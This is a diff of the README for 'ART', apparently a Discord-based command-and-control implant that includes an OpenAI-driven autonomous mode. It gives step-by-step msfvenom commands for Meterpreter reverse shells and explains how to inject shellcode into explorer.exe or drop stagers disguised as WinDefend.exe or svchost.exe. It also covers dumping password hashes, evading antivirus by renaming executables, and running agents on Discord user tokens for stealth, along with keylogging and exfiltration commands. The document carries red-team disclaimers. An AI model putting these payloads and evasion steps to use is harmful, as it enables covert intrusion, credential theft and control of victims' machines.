 - Persistence support is Windows-focused. Registry, Startup Shortcut, and Scheduled Task workflows are not portable to non-Windows systems.
 - The popup message command uses platform-specific behavior and is primarily intended for Windows targets.
 - Autonomous mode and report generation depend on external OpenAI availability and latency.
-- Default shell execution still uses `subprocess` with `shell=True`; long-running commands can delay responses even though report generation itself is now off the Discord event loop.
+- Default shell execution uses `subprocess` with `shell=True`; long-running commands can delay responses even though report generation itself is now off the Discord event loop.
 
 ---
 
 ## 23. Security & Cleanup
+
+> Operational security rules, artifact inventory, and post-engagement cleanup guidance.
 
 - **Never** share or commit bot tokens to any repository
 - **Never** deploy agents on systems without explicit written authorization
@@ -909,12 +940,13 @@ Operational artifacts to review and clean up as needed:
 - `Report.md` — temporary report file before upload to `#reports`
 - `agent_audit.log` — local audit trail if enabled in your workflow
 
-
 ---
 
 ## 24. Metasploit Framework Integration
 
-ART delivers Metasploit payloads to a victim through three distinct mechanisms. The ART agent acts purely as a delivery vehicle — once the payload executes, Metasploit opens a standard Meterpreter session entirely independent of ART.
+> Step-by-step guides for delivering Metasploit payloads via ART using shellcode injection (`!inject`) or EXE staging (`!stager`).
+
+ART delivers Metasploit payloads to a victim through two primary mechanisms. The ART agent acts purely as a delivery vehicle — once the payload executes, Metasploit opens a standard Meterpreter session entirely independent of ART.
 
 ```
 [MSF Operator Machine]                  [Victim Machine]
@@ -930,7 +962,7 @@ ART delivers Metasploit payloads to a victim through three distinct mechanisms. 
 
 ### 24.0 Quick-Copy Reference
 
-Replace `YOUR_IP` with your LHOST. All three approaches use the same listener `.rc` file.
+Replace `YOUR_IP` with your LHOST. All approaches use the same listener `.rc` file.
 
 **Step 1 — Generate the payload (run on your operator machine):**
 
@@ -940,12 +972,12 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=YOUR_IP LPORT=443 -f raw
 
 # Approach 2 — stager EXE  (for !stager)
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=YOUR_IP LPORT=443 -f exe -o stage.exe
-
 ```
 
-**Step 2 — Upload to `#payloads` (do this before anything else for Approach 2):**
-Drag-and-drop `stage.exe` into the `#payloads` Discord channel.
-No HTTP server needed — the agent fetches it straight from the Discord CDN:
+**Step 2 — Upload to `#payloads` (Approach 2 only):**
+
+Drag-and-drop `stage.exe` into the `#payloads` Discord channel. No HTTP server needed — the agent fetches it straight from the Discord CDN:
+
 ```
 !stager stage.exe
 ```
@@ -988,6 +1020,7 @@ Your `LHOST` must be reachable from the victim machine (correct external/VPN IP,
 #### Network Reachability — Common Scenarios
 
 **Same LAN (home lab or local network):**
+
 ```bash
 # Find your operator machine's local IP
 ip a          # Linux
@@ -996,6 +1029,7 @@ ipconfig      # Windows
 ```
 
 **Cloud VPS (publicly accessible server):**
+
 ```bash
 # LHOST = VPS public IP
 # Open LPORT in the firewall (example: UFW on Ubuntu)
@@ -1004,6 +1038,7 @@ sudo ufw allow 80/tcp
 ```
 
 **Home machine behind NAT (no direct public IP):**
+
 ```bash
 # Option 1 — ngrok (free tier, TCP tunnel)
 ngrok tcp 443
@@ -1034,11 +1069,13 @@ msfconsole -q -r listener.rc
 #### Step 2 — Generate shellcode
 
 **Linux — pipes directly to base64, paste the output into Discord:**
+
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=YOUR_IP LPORT=443 -f raw | base64 -w0
 ```
 
 **Windows operator (PowerShell):**
+
 ```powershell
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=YOUR_IP LPORT=443 -f raw -o shell.bin
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("shell.bin"))
@@ -1051,6 +1088,7 @@ Copy the entire output string — no spaces or line breaks.
 ```
 !ps
 ```
+
 Choose a stable, long-running process (`explorer.exe`, `RuntimeBroker.exe`, `svchost.exe`).
 
 #### Step 4 — Inject
@@ -1060,6 +1098,7 @@ Choose a stable, long-running process (`explorer.exe`, `RuntimeBroker.exe`, `svc
 ```
 
 Example:
+
 ```
 !inject 4812 TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA...
 ```
@@ -1096,11 +1135,13 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=YOUR_IP LPORT=443 -f exe
 #### Step 2 — Upload to `#payloads`
 
 Drag-and-drop `stage.exe` into the `#payloads` Discord channel, then run in the victim channel:
+
 ```
 !stager stage.exe
 ```
 
 Custom drop path:
+
 ```
 !stager stage.exe C:\Users\Public\svchost.exe
 ```
@@ -1116,18 +1157,14 @@ msfconsole -q -r listener.rc
 
 See [§24.0](#240-quick-copy-reference) for the `.rc` template.
 
-#### Step 4 — Drop and execute via ART
-
-Run the `!stager` command from Step 2.
-
-#### Step 5 — Catch the session
+#### Step 4 — Catch the session
 
 ```
 msf6 > sessions -l
 msf6 > sessions -i 1
 ```
 
-#### Step 6 — Cleanup (optional)
+#### Step 5 — Cleanup (optional)
 
 ```
 !delete C:\Users\<user>\AppData\Local\Microsoft\Windows\WinDefend.exe
@@ -1143,7 +1180,7 @@ msf6 > sessions -i 1
 
 ---
 
-### 24.5 Comparison Table
+### 24.4 Comparison Table
 
 | Feature | `!inject` | `!stager` |
 |---|---|---|
@@ -1157,9 +1194,9 @@ msf6 > sessions -i 1
 
 ---
 
-### 24.6 Full Example Walkthrough
+### 24.5 Full Example Walkthrough
 
-**Scenario:** You have an ART agent running on a Windows 10 target and want a full Meterpreter shell using shellcode injection into `explorer.exe`.
+**Scenario:** ART agent running on a Windows 10 target, want a full Meterpreter shell using shellcode injection into `explorer.exe`.
 
 **On your MSF machine:**
 
@@ -1176,12 +1213,13 @@ msfconsole -q -r listener.rc
 ```
 !ps
 ```
+
 → Note that `explorer.exe` is PID `3240`.
 
-Paste the base64 shellcode output from msfvenom:
 ```
 !inject 3240 <base64_shellcode_here>
 ```
+
 → ART responds: `✅ Shellcode (510 bytes) injected into PID 3240.`
 
 **Back in msfconsole:**
@@ -1197,13 +1235,13 @@ OS: Windows 10 (10.0 Build 19045)
 meterpreter > hashdump
 ```
 
-------
+---
 
-## 25. Improvement — One Bot, Many Agents (User Token Architecture)
+## 25. Architecture: One Bot, Many Agents
 
-The current architecture (one bot per agent) works well but requires registering a new Discord bot application for every target. The following describes a more scalable approach for future improvement.
+> A scalable alternative architecture using user tokens so a single C2 bot manages unlimited agents without registering a new bot application per target.
 
-### The Idea
+### Overview
 
 Instead of each agent running as its own bot, agents connect to Discord as **regular users** using user tokens. A single C2 bot manages all channels, roles, and communications while agents authenticate as users.
 
@@ -1221,12 +1259,24 @@ Improved:  Agent_1 (user) + Agent_2 (user) + Agent_3 (user) → Discord Server �
 | Stealth | Agents appear as bots | Agents appear as normal users |
 | Setup complexity | Medium | Low (after initial setup) |
 
-### How to Implement It
+### ⚠️ Legal & Ethical Notice
 
-#### 1. Keep the C2 Bot as the Controller
+> Automating Discord user accounts is against Discord's Terms of Service. Only use this method in authorized red team labs or research environments. Never use real personal Discord accounts.
+
+See [DISCLAIMER.md](DISCLAIMER.md) for the repository-wide disclaimer and a plain-language interpretation of the Liberia Cybercrime Act, 2021.
+
+---
+
+### Step 1 — Keep the C2 Bot as the Controller
+
 The existing `agent_template.py` continues to manage server structure, channels, and roles. No changes needed to the bot itself.
 
-#### 2. Switch Agent Library
+- **C2 Bot**: A single Discord bot manages all channels, roles, and communications.
+- **Agents**: Each agent runs as a Discord user (not a bot), using a user token for authentication.
+- **Scalability**: No need to register a new bot for each agent — unlimited agents per server.
+
+### Step 2 — Switch Agent Library
+
 The standard `discord.py` does not support user tokens. Replace it with `discord.py-self`, a drop-in replacement:
 
 ```bash
@@ -1235,124 +1285,76 @@ build_env\Scripts\python.exe -m pip uninstall discord.py -y
 build_env\Scripts\python.exe -m pip install discord.py-self
 ```
 
-#### 3. Create Discord User Accounts for Agents
-- Create one Discord user account per agent (or per campaign)
-- Log into each account and retrieve the user token:
-  1. Open Discord in a browser
-  2. Open DevTools (F12) → **Network** tab
-  3. Send any message → find a request with an `Authorization` header
-  4. Copy the token value
+### Step 3 — Create Discord User Accounts for Agents
 
-#### 4. Configure the Agent Script
+#### Manual Method
+
+1. Go to [Discord Registration](https://discord.com/register).
+2. Create a new user account for each agent (use unique emails; temporary email services are acceptable in isolated labs).
+3. Complete email verification and set a username.
+4. (Optional) Set a profile picture and nickname for easier tracking.
+
+#### Automated Account Creation (Advanced/Lab Only)
+
+- Use browser automation tools (e.g., Selenium, Puppeteer) to script account creation.
+- Services like [mail.tm](https://mail.tm) or [temp-mail.org](https://temp-mail.org) can be used for temporary emails.
+- **Note:** Automated account creation is rate-limited and may require CAPTCHA solving.
+
+### Step 4 — Retrieve User Tokens
+
+1. Log in to the agent account in a browser.
+2. Open DevTools (F12) → **Network** tab.
+3. Send any message in Discord.
+4. Find a request with an `Authorization` header.
+5. Copy the token value (this is the user token for the agent).
+
+### Step 5 — Configure the Agent Script
+
 Replace `BOT_TOKEN` with the user token — the rest of the code stays the same:
 
 ```python
 BOT_TOKEN = "<DISCORD_USER_TOKEN_HERE>"
 ```
 
-#### 5. Build and Deploy as Normal
-```bash
-.\\build.bat
-```
+(Optional) Adjust the script to use user-specific logic if needed — most bot logic works as-is with `discord.py-self`.
 
-### Important Warning
+### Step 6 — Add Agents to the Server
 
-> Using user tokens for automation violates Discord's Terms of Service. User accounts running automated scripts risk permanent ban. **Only use this approach in isolated lab environments or with explicit authorization.** Never use real personal Discord accounts.
-
----
-
-## 26. Comprehensive Guide: One Bot, Many Agents (User Token Architecture)
-
-This section provides a step-by-step, production-grade guide to implementing a scalable Discord C2 architecture using user tokens (one bot, many agents). This approach allows you to control many agents with a single C2 bot, while each agent appears as a normal Discord user.
-
-### ⚠️ Legal & Ethical Notice
-> Automating Discord user accounts is against Discord's Terms of Service. Only use this method in authorized red team labs or research environments. Never use real personal Discord accounts.
-
-See [DISCLAIMER.md](DISCLAIMER.md) for the repository-wide disclaimer and a plain-language interpretation of the Liberia Cybercrime Act, 2021.
-
-### 1. Overview
-- **C2 Bot**: A single Discord bot manages all channels, roles, and communications.
-- **Agents**: Each agent runs as a Discord user (not a bot), using a user token for authentication.
-- **Scalability**: No need to register a new bot for each agent. Unlimited agents per server.
-
-### 2. Prerequisites
-- A Discord server with proper structure (see above).
-- Python 3.13+ and `pyinstaller` for building agents.
-- The `discord.py-self` library for user-token agents.
-- (Optional) Automation tools for creating Discord user accounts (see below).
-
-### 3. Setting Up the C2 Bot (Controller)
-- Use your existing `agent_template.py` as the C2 bot controller.
-- The C2 bot manages all server structure, channels, and roles.
-- No changes needed to the C2 bot for this architecture.
-
-### 4. Creating Discord User Accounts for Agents
-#### Manual Method
-1. Go to [Discord Registration](https://discord.com/register).
-2. Create a new user account for each agent (use unique emails, can use temporary email services for labs).
-3. Complete email verification and set a username.
-4. (Optional) Set a profile picture and nickname for easier tracking.
-
-#### Automated Account Creation (Advanced/Lab Only)
-- Use browser automation tools (e.g., Selenium, Puppeteer) to script account creation.
-- Services like [mail.tm](https://mail.tm) or [temp-mail.org](https://temp-mail.org) can be used for temporary emails.
-- **Note:** Automated account creation is rate-limited and may require CAPTCHA solving.
-
-### 5. Retrieving User Tokens
-1. Log in to the agent account in a browser.
-2. Open DevTools (F12) → Network tab.
-3. Send any message in Discord.
-4. Find a request with an `Authorization` header.
-5. Copy the token value (this is the user token for the agent).
-
-### 6. Preparing the Agent Script
-1. Uninstall `discord.py` and install `discord.py-self` in your build environment:
-   ```bash
-   build_env\Scripts\python.exe -m pip uninstall discord.py -y
-   build_env\Scripts\python.exe -m pip install discord.py-self
-   ```
-2. In `agent_template.py`, replace the `BOT_TOKEN` value with the user token:
-   ```python
-   BOT_TOKEN = "<DISCORD_USER_TOKEN_HERE>"
-   ```
-3. (Optional) Adjust the script to use user-specific logic if needed (most bot logic works as-is with `discord.py-self`).
-
-### 7. Adding Agents to the Server
 - Log in to each agent account in a browser or via the script.
 - Accept the server invite link (generated by the C2 bot or manually).
 - Agents will appear as normal users in the server.
 
-### 8. Building and Deploying Agents
-1. Build the agent executable as usual:
-   ```bash
-   build.bat
-   ```
-2. Rename the EXE for each agent (e.g., `agent-alice.exe`).
-3. Deploy and run on the target machine.
+### Step 7 — Build and Deploy Agents
 
-### 9. Operating the C2
-- The C2 bot manages all channels and roles.
-- Agents (users) join the server and communicate via their assigned channels.
-- All commands and exfiltration work as with the bot-based model.
+```bat
+.\build.bat
+```
 
-### 10. Automation Tips
+Rename the EXE for each agent (e.g., `agent-alice.exe`) and deploy as normal. All commands and exfiltration work identically to the bot-based model.
+
+### Step 8 — Automation Tips
+
 - Use scripts to automate user account creation and token extraction for large-scale deployments.
 - Maintain a secure log of user tokens and agent assignments.
 - Regularly audit server membership and permissions.
 
-### 11. Security & Cleanup
+### Step 9 — Security & Cleanup
+
 - Never use real/personal Discord accounts for agents.
 - Remove unused user accounts and tokens after operations.
 - Rotate tokens if compromise is suspected.
 
-### 12. Troubleshooting
+### Step 10 — Troubleshooting
+
 - If an agent cannot join the server, check invite validity and account status.
 - If commands do not work, ensure `discord.py-self` is installed and the token is valid.
 - Monitor for Discord bans or rate limits on automated accounts.
 
 ---
 
-## 27. Production Deployment Checklist & Security Notes
+## 26. Production Deployment Checklist
+
+> Complete pre-deployment, post-deployment, and end-of-engagement checklists plus operational security notes.
 
 ### Pre-Deployment — Bot & Discord Setup
 
@@ -1366,16 +1368,16 @@ See [DISCLAIMER.md](DISCLAIMER.md) for the repository-wide disclaimer and a plai
 
 - [ ] `BOT_TOKEN` set in `agent_template.py` to the token for this specific target
 - [ ] `OPENAI_API_KEY` set (required for `!report`, `!abort`, `!mode active`)
-- [ ] RSA key pair generated with `.\\build.bat genkey` (run once per operator, not per deployment)
+- [ ] RSA key pair generated with `.\build.bat genkey` (run once per operator, not per deployment)
 - [ ] `OPERATOR_RSA_PUBLIC_KEY` populated with the full PEM contents of `op_public.pem`
 - [ ] `op_private.pem` stored **offline** and **not committed** to any repository
 - [ ] No secrets are hardcoded and committed to version control
 
 ### Pre-Deployment — Build & Test
 
-- [ ] Built with `.\\build.bat` inside a clean `build_env\` virtual environment
+- [ ] Built with `.\build.bat` inside a clean `build_env\` virtual environment
 - [ ] `build\<name>.exe` exists with the correct icon
-- [ ] Smoke test passed: `.\\build.bat --smoke-test` (size is 15–30 MB, `.sha256` generated)
+- [ ] Smoke test passed: `.\build.bat --smoke-test` (size is 15–30 MB, `.sha256` generated)
 - [ ] Local test run: agent checked in within 10 s, `cmd-*` channel appeared, `!whoami` responded, process killed cleanly
 - [ ] EXE renamed to a convincing system-process name that matches the icon
 - [ ] EXE placed in a directory path that matches its name
@@ -1411,7 +1413,7 @@ See [DISCLAIMER.md](DISCLAIMER.md) for the repository-wide disclaimer and a plai
 | Agent detected by AV at rest | Rebuild with a different icon/name; switch payload delivery to `!inject` |
 | Agent loses Discord connection | Monitor `#sitreps` — silence for >10 min indicates the agent is dead or disconnected |
 | Unauthorized command access | All commands are logged to `#global-logs` with timestamps — audit regularly |
-| Stager EXE quarantined | Switch to the disk-less approaches: `!inject` (shellcode) |
+| Stager EXE quarantined | Switch to the disk-less approach: `!inject` (shellcode) |
 | Discord rate-limit exhaustion | Each agent has its own token — rate limits are per-token, not shared across agents |
 | Long-running shell command hangs the channel | Use `!shell taskkill /f /im <process>.exe` from another session, or restart the agent |
 
@@ -1437,6 +1439,28 @@ See [DISCLAIMER.md](DISCLAIMER.md) for the repository-wide disclaimer and a plai
 
 ---
 
-*For advanced automation scripts, user account management, or further guidance, contact your developer or red team lead.*
+## 27. build.bat — Complete Reference
+
+> Full reference for all `build.bat` commands, switches, and behavior — see [§13 Step 9](#13-step-9--build-a-standalone-exe) for the guided walkthrough.
+
+See [§13 Step 9 — Build a Standalone EXE](#13-step-9--build-a-standalone-exe) for the complete command reference, all advanced switches, and example build commands.
 
 ---
+
+## 28. agent_template.py — Internals Reference
+
+> Internal structure, configuration constants, and extension points for `agent_template.py`.
+
+All configuration constants, command handlers, and extension points are documented inline in `agent_template.py`. Key areas:
+
+- **Constants block** — `BOT_TOKEN`, `OPENAI_API_KEY`, `OPERATOR_RSA_PUBLIC_KEY`, `RECOVERY_URL`
+- **`on_ready` handler** — server structure creation, role setup, victim channel creation, check-in post, heartbeat loop start
+- **`on_message` handler** — command dispatch, global logging, output truncation
+- **Command handlers** — one async function per command group (recon, file ops, loot, pharm, keylog, persist, lateral, inject, encrypt)
+- **Heartbeat loop** — background task with randomized 3–5.5 min jitter
+- **Offline monitor** — background task that renames the victim channel after 5 min of silence
+- **Report generator** — async function that calls the OpenAI API and uploads the result to `#reports`
+
+---
+
+*For advanced automation scripts, user account management, or further guidance, contact your developer or red team lead.*
